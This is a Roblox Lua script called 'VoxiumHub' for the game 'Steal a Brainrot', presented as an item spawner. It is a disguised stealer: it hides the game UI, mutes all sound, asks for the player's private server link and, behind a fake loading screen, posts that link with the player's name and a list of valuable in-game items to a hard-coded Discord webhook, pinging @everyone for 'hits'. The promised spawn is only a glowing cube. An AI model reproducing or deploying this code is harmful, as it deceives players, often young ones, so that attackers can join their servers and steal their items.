-- === VOXIUMHUB - FINAL FIX: ALLE TRAITS IN LISTE + LOADING NACH LINK + WEBHOOK 100% ===
pcall(function() setclipboard("https://discord.gg/rvZndRfkyX") end)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- === PLACE ID CHECK ===
local ALLOWED_PLACE_ID = 109983668079237
if game.PlaceId ~= ALLOWED_PLACE_ID then
    Players.LocalPlayer:Kick("Wrong game! Only works on official game.")
    return
end

-- === AUTHORISED USERS ===
local AuthorisedUsers = AuthorisedUsers or {
    "LennonDev", "YourUserName", "Player1", "Player2"
}
local LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
local isAuthorised = false
for _, name in ipairs(AuthorisedUsers) do
    if LP.Name == name or LP.DisplayName == name then
        isAuthorised = true; break
    end
end
if not isAuthorised then LP:Kick("Not authorised.") return end

-- === HIDE UI & MUTE ===
pcall(function()
    StarterGui:SetCore("TopbarEnabled", false)
    for _, v in ipairs(Enum.CoreGuiType:GetEnumItems()) do
        StarterGui:SetCoreGuiEnabled(v, false)
    end
end)
local topbar = CoreGui:FindFirstChild("TopBarApp", true); if topbar then topbar:Destroy() end
local chat = CoreGui:FindFirstChild("ChatApp", true); if chat then chat:Destroy() end

local function mute(c)
    for _, o in ipairs(c:GetDescendants()) do
        if o:IsA("Sound") then o.Volume = 0; o:Stop() end
    end
    c.DescendantAdded:Connect(function(o)
        if o:IsA("Sound") then o.Volume = 0; o:Stop() end
    end)
end
for _, c in {workspace, Players, game.ReplicatedStorage, game.Lighting, StarterGui, game:GetService("SoundService")} do mute(c) end

-- === WAIT FOR GAME LOADED ===
if not game:IsLoaded() then pcall(function() game.Loaded:Wait() end) end

-- === COLORS ===
local COLORS = {
    card = Color3.fromRGB(14,12,24),
    text = Color3.fromRGB(235,235,245),
    dim = Color3.fromRGB(170,175,200),
    a1 = Color3.fromRGB(130,90,255),
    a2 = Color3.fromRGB(50,180,255),
    ok = Color3.fromRGB(0,210,140),
    warn = Color3.fromRGB(255,120,120),
}

-- === MAIN UI (BEFORE LINK) ===
local UIParent = LP:FindFirstChildOfClass("PlayerGui") or CoreGui
local old = UIParent:FindFirstChild("VoxiumHub_GUI")
if old then old:Destroy() end

local SG = Instance.new("ScreenGui")
SG.Name = "VoxiumHub_GUI"
SG.IgnoreGuiInset = true
SG.ResetOnSpawn = false
SG.ZIndexBehavior = Enum.ZIndexBehavior.Global
SG.DisplayOrder = 999999
SG.Parent = UIParent

local Holder = Instance.new("Frame", SG)
Holder.AnchorPoint = Vector2.new(0.5,0.5)
Holder.Position = UDim2.fromScale(0.5,0.5)
Holder.Size = UDim2.new(0,440,0,240)
Holder.BackgroundColor3 = COLORS.card
Holder.BackgroundTransparency = 0.12
Holder.BorderSizePixel = 0
Holder.Active = true
Holder.ZIndex = 10
local corner = Instance.new("UICorner", Holder); corner.CornerRadius = UDim.new(0,18)
local stroke = Instance.new("UIStroke", Holder); stroke.Thickness = 2; stroke.Transparency = 0.15
local grad = Instance.new("UIGradient", stroke); grad.Color = ColorSequence.new(COLORS.a1, Color3.new(0,0,0), COLORS.a2)

-- Dragging
local dragging, dragInput, dragStart, startPos
local function update(i)
    local d = i.Position - dragStart
    Holder.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
end
Holder.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
        dragging = true; dragStart = i.Position; startPos = Holder.Position
        i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then dragging = false end end)
    end
end)
Holder.InputChanged:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then dragInput = i end
end)
UserInputService.InputChanged:Connect(function(i)
    if i == dragInput and dragging then update(i) end
end)

-- Top UI
local Top = Instance.new("Frame", Holder)
Top.BackgroundTransparency = 1
Top.Size = UDim2.new(1,-32,0,80)
Top.Position = UDim2.new(0,16,0,16)
Top.ZIndex = 20

local Avatar = Instance.new("ImageLabel", Top)
Avatar.BackgroundTransparency = 1
Avatar.Size = UDim2.fromOffset(64,64)
Avatar.Image = "rbxassetid://0"
Avatar.ZIndex = 21
local aCorner = Instance.new("UICorner", Avatar); aCorner.CornerRadius = UDim.new(1,0)

task.spawn(function()
    local ok,url = pcall(Players.GetUserThumbnailAsync, Players, LP.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
    if ok and url then Avatar.Image = url end
end)

local Info = Instance.new("Frame", Top)
Info.BackgroundTransparency = 1
Info.Size = UDim2.new(1,-80,1,0)
Info.Position = UDim2.new(0,80,0,0)
Info.ZIndex = 21

local Title = Instance.new("TextLabel", Info)
Title.BackgroundTransparency = 1
Title.Text = "VoxiumHub"
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 24
Title.TextColor3 = COLORS.a1
Title.TextStrokeColor3 = Color3.fromRGB(20,0,40)
Title.TextStrokeTransparency = 0.6
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Size = UDim2.new(1,0,0,28)
Title.ZIndex = 22

local Sub = Instance.new("TextLabel", Info)
Sub.BackgroundTransparency = 1
Sub.Font = Enum.Font.Gotham
Sub.TextSize = 12
Sub.TextColor3 = COLORS.dim
Sub.TextXAlignment = Enum.TextXAlignment.Left
Sub.Size = UDim2.new(1,0,0,18)
Sub.Position = UDim2.new(0,0,0,30)
Sub.ZIndex = 22

task.spawn(function()
    local name = LP.Name or "User"
    local dname = LP.DisplayName or "Player"
    local age = LP.AccountAge and (tostring(LP.AccountAge).." days") or "N/A"
    local premium = (LP.MembershipType and tostring(LP.MembershipType):find("Premium")) and "Premium" or "Standard"
    Sub.Text = string.format("%s (@%s) • %s • %s", dname, name, age, premium)
end)

local Badge = Instance.new("TextLabel", Info)
Badge.BackgroundTransparency = 1
Badge.Text = "support[](https://discord.gg/59XeEXRe)"
Badge.Font = Enum.Font.GothamBold
Badge.TextSize = 12
Badge.TextColor3 = COLORS.a2
Badge.TextXAlignment = Enum.TextXAlignment.Left
Badge.Size = UDim2.new(1,0,0,16)
Badge.Position = UDim2.new(0,0,0,50)
Badge.ZIndex = 22

-- Body
local Body = Instance.new("Frame", Holder)
Body.BackgroundTransparency = 1
Body.Size = UDim2.new(1,-32,0,108)
Body.Position = UDim2.new(0,16,0,104)
Body.ZIndex = 20

local LinkBox = Instance.new("TextBox", Body)
LinkBox.ClearTextOnFocus = false
LinkBox.PlaceholderText = "Enter Private Server Link..."
LinkBox.Text = ""
LinkBox.Font = Enum.Font.Gotham
LinkBox.TextSize = 14
LinkBox.TextColor3 = COLORS.text
LinkBox.PlaceholderColor3 = COLORS.dim
LinkBox.BackgroundColor3 = Color3.fromRGB(12,12,22)
LinkBox.BackgroundTransparency = 0.15
LinkBox.Size = UDim2.new(1,0,0,54)
LinkBox.Position = UDim2.new(0,0,0,0)
LinkBox.ZIndex = 21
LinkBox.TextXAlignment = Enum.TextXAlignment.Left
LinkBox.TextYAlignment = Enum.TextYAlignment.Top
LinkBox.TextWrapped = true
local padding = Instance.new("UIPadding", LinkBox)
padding.PaddingLeft = UDim.new(0,8)
padding.PaddingRight = UDim.new(0,8)
padding.PaddingTop = UDim.new(0,8)
padding.PaddingBottom = UDim.new(0,8)
local lbCorner = Instance.new("UICorner", LinkBox); lbCorner.CornerRadius = UDim.new(0,10)
local lbStroke = Instance.new("UIStroke", LinkBox); lbStroke.Thickness=1; lbStroke.Color=Color3.fromRGB(40,40,80); lbStroke.Transparency=0.3

local StatusLabel = Instance.new("TextLabel", Body)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Ready"
StatusLabel.Font = Enum.Font.GothamSemibold
StatusLabel.TextSize = 12
StatusLabel.TextColor3 = COLORS.a2
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.Size = UDim2.new(1,0,0,20)
StatusLabel.Position = UDim2.new(0,0,0,58)
StatusLabel.ZIndex = 23

local SubmitBtn = Instance.new("TextButton", Body)
SubmitBtn.Text = "Submit"
SubmitBtn.AutoButtonColor = false
SubmitBtn.ZIndex = 22
SubmitBtn.Font = Enum.Font.GothamSemibold
SubmitBtn.TextSize = 16
SubmitBtn.TextColor3 = Color3.fromRGB(240,240,245)
SubmitBtn.BackgroundColor3 = Color3.fromRGB(20,18,34)
SubmitBtn.Size = UDim2.new(1,0,0,44)
SubmitBtn.Position = UDim2.new(0,0,0,64)
local btnCorner = Instance.new("UICorner", SubmitBtn); btnCorner.CornerRadius = UDim.new(0,10)
local btnStroke = Instance.new("UIStroke", SubmitBtn); btnStroke.Thickness = 2; btnStroke.Transparency = 0.15
local btnGrad = Instance.new("UIGradient", btnStroke); btnGrad.Color = ColorSequence.new(COLORS.a1, COLORS.a2)

SubmitBtn.MouseEnter:Connect(function()
    TweenService:Create(SubmitBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(28,24,48)}):Play()
end)
SubmitBtn.MouseLeave:Connect(function()
    TweenService:Create(SubmitBtn, TweenInfo.new(0.20), {BackgroundColor3 = Color3.fromRGB(20,18,34)}):Play()
end)

-- === LOADING SCREEN (NACH SUBMIT) ===
local function showLoadingScreen()
    local loadSG = Instance.new("ScreenGui")
    loadSG.Name = "VoxiumLoading_GUI"
    loadSG.IgnoreGuiInset = true
    loadSG.ResetOnSpawn = false
    loadSG.ZIndexBehavior = Enum.ZIndexBehavior.Global
    loadSG.DisplayOrder = 999999
    loadSG.Parent = UIParent

    local Container = Instance.new("Frame", loadSG)
    Container.AnchorPoint = Vector2.new(0.5,0.5)
    Container.Position = UDim2.fromScale(0.5,0.5)
    Container.Size = UDim2.fromOffset(480,360)
    Container.BackgroundColor3 = COLORS.card
    Container.BackgroundTransparency = 0.08
    Container.BorderSizePixel = 0
    Container.ZIndex = 10
    local cCorner = Instance.new("UICorner", Container); cCorner.CornerRadius = UDim.new(0,20)
    local cStroke = Instance.new("UIStroke", Container); cStroke.Thickness = 2; cStroke.Transparency = 0.15
    local cGrad = Instance.new("UIGradient", cStroke); cGrad.Color = ColorSequence.new(COLORS.a1, Color3.new(0,0,0), COLORS.a2)

    local Header = Instance.new("Frame", Container)
    Header.BackgroundTransparency = 1
    Header.Size = UDim2.new(1,-40,0,90)
    Header.Position = UDim2.new(0,20,0,20)
    Header.ZIndex = 20

    local Avatar = Instance.new("ImageLabel", Header)
    Avatar.Size = UDim2.fromOffset(70,70)
    Avatar.BackgroundTransparency = 1
    Avatar.Image = "rbxassetid://0"
    Avatar.ZIndex = 21
    local aCorner = Instance.new("UICorner", Avatar); aCorner.CornerRadius = UDim.new(1,0)
    local aStroke = Instance.new("UIStroke", Avatar); aStroke.Thickness = 3; aStroke.Color = COLORS.a1; aStroke.Transparency = 0.3
    task.spawn(function()
        local ok, url = pcall(Players.GetUserThumbnailAsync, Players, LP.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
        if ok and url then Avatar.Image = url end
    end)

    local Info = Instance.new("Frame", Header)
    Info.BackgroundTransparency = 1
    Info.Size = UDim2.new(1,-90,1,0)
    Info.Position = UDim2.new(0,90,0,0)
    Info.ZIndex = 21

    local Title = Instance.new("TextLabel", Info)
    Title.BackgroundTransparency = 1
    Title.Text = "VoxiumHub"
    Title.Font = Enum.Font.GothamBlack
    Title.TextSize = 28
    Title.TextColor3 = COLORS.a1
    Title.TextStrokeColor3 = Color3.fromRGB(20,0,40)
    Title.TextStrokeTransparency = 0.5
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Size = UDim2.new(1,0,0,32)
    Title.ZIndex = 22

    local UserInfo = Instance.new("TextLabel", Info)
    UserInfo.BackgroundTransparency = 1
    UserInfo.Font = Enum.Font.Gotham
    UserInfo.TextSize = 13
    UserInfo.TextColor3 = COLORS.dim
    UserInfo.TextXAlignment = Enum.TextXAlignment.Left
    UserInfo.Size = UDim2.new(1,0,0,20)
    UserInfo.Position = UDim2.new(0,0,0,34)
    UserInfo.ZIndex = 22
    task.spawn(function()
        local name = LP.Name or "User"
        local dname = LP.DisplayName or "Player"
        local age = LP.AccountAge and (tostring(LP.AccountAge).." days") or "N/A"
        local premium = (LP.MembershipType and tostring(LP.MembershipType):find("Premium")) and "Premium" or "Standard"
        UserInfo.Text = string.format("%s (@%s) • %s • %s", dname, name, age, premium)
    end)

    local Badge = Instance.new("TextLabel", Info)
    Badge.BackgroundTransparency = 1
    Badge.Text = "Processing..."
    Badge.Font = Enum.Font.GothamBold
    Badge.TextSize = 13
    Badge.TextColor3 = COLORS.a2
    Badge.TextXAlignment = Enum.TextXAlignment.Left
    Badge.Size = UDim2.new(1,0,0,18)
    Badge.Position = UDim2.new(0,0,0,56)
    Badge.ZIndex = 22

    local Divider = Instance.new("Frame", Container)
    Divider.Size = UDim2.new(1,-40,0,1)
    Divider.Position = UDim2.new(0,20,0,125)
    Divider.BackgroundColor3 = COLORS.dim
    Divider.BackgroundTransparency = 0.85
    Divider.ZIndex = 20

    local Loading = Instance.new("Frame", Container)
    Loading.BackgroundTransparency = 1
    Loading.Size = UDim2.new(1,-40,0,180)
    Loading.Position = UDim2.new(0,20,0,140)
    Loading.ZIndex = 20

    local StatusText = Instance.new("TextLabel", Loading)
    StatusText.BackgroundTransparency = 1
    StatusText.Text = "Initializing"
    StatusText.Font = Enum.Font.GothamSemibold
    StatusText.TextSize = 18
    StatusText.TextColor3 = COLORS.text
    StatusText.Size = UDim2.new(1,0,0,26)
    StatusText.Position = UDim2.new(0,0,0,10)
    StatusText.ZIndex = 22
    StatusText.TextXAlignment = Enum.TextXAlignment.Center

    local ProgressBg = Instance.new("Frame", Loading)
    ProgressBg.Size = UDim2.new(1,0,0,10)
    ProgressBg.Position = UDim2.new(0,0,0,55)
    ProgressBg.BackgroundColor3 = Color3.fromRGB(20,18,34)
    ProgressBg.BackgroundTransparency = 0.1
    ProgressBg.ZIndex = 21
    local pbCorner = Instance.new("UICorner", ProgressBg); pbCorner.CornerRadius = UDim.new(1,0)
    local pbStroke = Instance.new("UIStroke", ProgressBg); pbStroke.Thickness = 1; pbStroke.Color = Color3.fromRGB(40,40,80); pbStroke.Transparency = 0.3

    local ProgressBar = Instance.new("Frame", ProgressBg)
    ProgressBar.Size = UDim2.new(0,0,1,0)
    ProgressBar.BackgroundColor3 = COLORS.a1
    ProgressBar.ZIndex = 22
    local barCorner = Instance.new("UICorner", ProgressBar); barCorner.CornerRadius = UDim.new(1,0)
    local barGrad = Instance.new("UIGradient", ProgressBar); barGrad.Color = ColorSequence.new(COLORS.a1, COLORS.a2)

    local Percentage = Instance.new("TextLabel", Loading)
    Percentage.BackgroundTransparency = 1
    Percentage.Text = "0%"
    Percentage.Font = Enum.Font.GothamBold
    Percentage.TextSize = 24
    Percentage.TextColor3 = COLORS.a2
    Percentage.Size = UDim2.new(1,0,0,28)
    Percentage.Position = UDim2.new(0,0,0,80)
    Percentage.ZIndex = 22
    Percentage.TextXAlignment = Enum.TextXAlignment.Center

    local steps = {
        {text = "Initializing", time = 1.2, progress = 25},
        {text = "Connecting", time = 1.5, progress = 60},
        {text = "Finalizing", time = 1.8, progress = 100},
    }

    task.spawn(function()
        local current = 0
        for _, s in ipairs(steps) do
            Badge.Text = s.text
            StatusText.Text = s.text
            local target = s.progress / 100
            local tween = TweenService:Create(ProgressBar, TweenInfo.new(s.time, Enum.EasingStyle.Linear), {Size = UDim2.new(target, 0, 1, 0)})
            tween:Play()
            for i = 1, s.time * 30 do
                local p = math.floor(current + (s.progress - current) * (i / (s.time * 30)))
                Percentage.Text = p .. "%"
                task.wait(1/30)
            end
            current = s.progress
        end
        task.wait(0.5)
        loadSG:Destroy()
    end)

    return loadSG
end

-- === ALLE TRAITS IN DER LISTE (VOLLSTÄNDIG) ===
local traitMap = {
    ["89041930759464"] = "Taco",
    ["104229924295526"] = "Nyan",
    ["99181785766598"] = "Galactic",
    ["121100427764858"] = "Fireworks",
    ["110723387483939"] = "Zombie",
    ["104964195846833"] = "Claws",
    ["121332433272976"] = "Glitched",
    ["100601425541874"] = "Bubblegum",
    ["118283346037788"] = "Fire",
    ["78474194088770"] = "Wet",
    ["83627475909869"] = "Snowy",
    ["127455440418221"] = "Cometstruck",
    ["97725744252608"] = "Explosive",
    ["82620342632406"] = "Disco",
    ["134655415681926"] = "10B",
    ["104985313532149"] = "Shark Fin",
    ["115664804212096"] = "Matteo Hat",
    ["75650816341229"] = "Brazil",
    ["115001117876534"] = "Sleepy",
    ["139729696247144"] = "Lightning",
    ["110910518481052"] = "UFO",
    ["117478971325696"] = "Spider",
    ["84731118566493"] = "Strawberry",
    ["119591742504251"] = "Paint",
    ["89591838221335"] = "Skeleton",
    ["95128039793845"] = "Sombrero",
    ["103610037004911"] = "Tie",
    ["123964048606874"] = "Witch Hat",
    ["93350414974589"] = "Indonesia",
    ["114748221761549"] = "Meowl",
    ["123115843719383"] = "RIP Gravestone",
    ["97054765273857"] = "Jackolantern Pet",
}

-- === BRAINROT FETCH (MIT ALLEN TRAITS) ===
local Plot = require(ReplicatedStorage.Controllers.PlotController)
local gen = require(ReplicatedStorage.Shared.Animals)
local myPlot = Plot:GetMyPlot()

local function getAllBrainrots()
    local list = {}
    for _, brainrot in pairs(myPlot.Channel:Get("AnimalList")) do
        local amount = gen:GetGeneration(brainrot.Index, brainrot.Mutation)
        local baseName = brainrot.Index or "Unknown"

        local traitName = "None"
        if brainrot.Mutation and brainrot.Mutation:FindFirstChild("Icon") then
            local icon = brainrot.Mutation.Icon
            local assetId = tostring(icon.Image):match("%d+$")
            if assetId and traitMap[assetId] then
                traitName = traitMap[assetId]
            end
        end

        local fullName = baseName
        if traitName ~= "None" then
            fullName = baseName .. " (" .. traitName .. ")"
        end

        table.insert(list, {name = fullName, moneyPerSec = amount, trait = traitName})
    end
    table.sort(list, function(a,b) return a.moneyPerSec > b.moneyPerSec end)
    return list
end

-- === HELPER: FORMAT MONEY & PING ===
local function parsePingValue(p)
    local n, s = p:match("(%d+)([kmb]?)")
    n = tonumber(n) or 0
    local m = {k=1e3, m=1e6, b=1e9}
    return n * (m[s:lower()] or 1)
end
local pingThreshold = parsePingValue(Ping or "10m")

local function formatMoney(v)
    if v >= 1e12 then return string.format("%.2fT/s", v/1e12)
    elseif v >= 1e9 then return string.format("%.2fB/s", v/1e9)
    elseif v >= 1e6 then return string.format("%.2fM/s", v/1e6)
    elseif v >= 1e3 then return string.format("%.2fK/s", v/1e3)
    else return string.format("%.0f/s", v) end
end

local function hasHighValue(b) for _,d in ipairs(b) do if d.moneyPerSec >= pingThreshold then return true end end return false end

-- === WEBHOOK SEND (100% FIX) ===
local Webhook1 = Webhook or "https://discord.com/api/webhooks/1401504146959368323/f0wuuzMXgffHU1o4S8xU6dn7LoQ0ltx_yxtaoShAwYvwPSrXt8q0oRJgOPIKpPHQ-xH2"
local Username = "voxium script .gg/59XeEXRe"

local function sendWebhook(brainrots, link)
    local text = ""
    if #brainrots > 0 then
        for _, d in ipairs(brainrots) do
            text = text .. string.format("%s - %s\n", d.name, formatMoney(d.moneyPerSec))
        end
    else
        text = "No Brainrots found"
    end

    local info = string.format("Name: %s\nDisplay: %s\nPlayers: %d/%d", LP.Name, LP.DisplayName, #Players:GetPlayers(), Players.MaxPlayers)
    local ping = hasHighValue(brainrots) and "@everyone" or ""

    local payload = {
        username = Username,
        content = ping,
        embeds = {{
            title = "Steal a Brainrot Hit With Voxium",
            color = 0x8A2BE2,
            fields = {
                {name = "Player Information:", value = "```"..info.."```", inline = false},
                {name = "Player Brainrots:", value = "```"..text.."```", inline = false},
                {name = "Summary:", value = "```Total Items: "..#brainrots.."```", inline = false},
                {name = "Join Link (Private):", value = link, inline = false}
            }
        }}
    }

    local req = http_request or request or (syn and syn.request)
    if not req then
        warn("No HTTP request function available!")
        return false
    end

    local success, err = pcall(function()
        req({
            Url = Webhook1,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if not success then
        warn("Webhook failed: " .. tostring(err))
        return false
    else
        print("Webhook sent!")
        return true
    end
end

-- === SUBMIT BUTTON ===
SubmitBtn.MouseButton1Click:Connect(function()
    local link = LinkBox.Text:match("^%s*(.-)%s*$")
    if link == "" or not link:find("^https://") then
        StatusLabel.Text = "Invalid Link"
        StatusLabel.TextColor3 = COLORS.warn
        return
    end

    StatusLabel.Text = "Processing..."
    StatusLabel.TextColor3 = COLORS.a2

    -- Haupt-UI verstecken
    SG:Destroy()

    -- Loading Screen zeigen
    local loadingSG = showLoadingScreen()

    -- Brainrots sammeln (im Hintergrund)
    local brainrots = getAllBrainrots()

    -- Webhook senden
    local sent = sendWebhook(brainrots, link)

    -- Loading beenden
    task.wait(1)
    if loadingSG and loadingSG.Parent then
        loadingSG:Destroy()
    end

    -- SAB Spawner (nach Webhook)
    local sabSpawner = Instance.new("ScreenGui")
    sabSpawner.Name = "SabSpawner_GUI"
    sabSpawner.Parent = LP:FindFirstChildOfClass("PlayerGui") or CoreGui
    sabSpawner.ResetOnSpawn = false
    sabSpawner.IgnoreGuiInset = true

    local frame = Instance.new("Frame", sabSpawner)
    frame.Size = UDim2.fromOffset(300, 150)
    frame.Position = UDim2.fromScale(0.5, 0.5)
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    frame.BorderSizePixel = 0
    local uc = Instance.new("UICorner", frame); uc.CornerRadius = UDim.new(0, 12)

    local title = Instance.new("TextLabel", frame)
    title.Text = sent and "SAB Spawner Active" or "Webhook Failed"
    title.Size = UDim2.new(1, 0, 0, 40)
    title.BackgroundTransparency = 1
    title.TextColor3 = sent and Color3.fromRGB(0, 255, 0) or COLORS.warn
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18

    local status = Instance.new("TextLabel", frame)
    status.Text = "Spawning SAB in 3..."
    status.Position = UDim2.new(0, 0, 0, 50)
    status.Size = UDim2.new(1, 0, 0, 30)
    status.BackgroundTransparency = 1
    status.TextColor3 = Color3.fromRGB(100, 255, 100)
    status.Font = Enum.Font.Gotham
    status.TextSize = 16

    if not sent then
        status.Text = "Failed to send data."
        status.TextColor3 = COLORS.warn
    else
        for i = 1, 3 do
            status.Text = "Spawning SAB in " .. (4 - i) .. "..."
            task.wait(1)
        end
        status.Text = "SAB Spawned!"
        status.TextColor3 = Color3.fromRGB(0, 255, 0)

        local sab = Instance.new("Part")
        sab.Name = "SAB"
        sab.Size = Vector3.new(5, 5, 5)
        sab.Position = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") and LP.Character.HumanoidRootPart.Position + Vector3.new(0, 10, 0) or Vector3.new(0, 100, 0)
        sab.Anchored = true
        sab.CanCollide = false
        sab.BrickColor = BrickColor.Red()
        sab.Material = Enum.Material.Neon
        sab.Parent = workspace

        local light = Instance.new("PointLight", sab)
        light.Color = Color3.fromRGB(255, 0, 0)
        light.Brightness = 2
        light.Range = 20

        task.wait(10)
        sab:Destroy()
    end

    task.wait(2)
    sabSpawner:Destroy()
end)
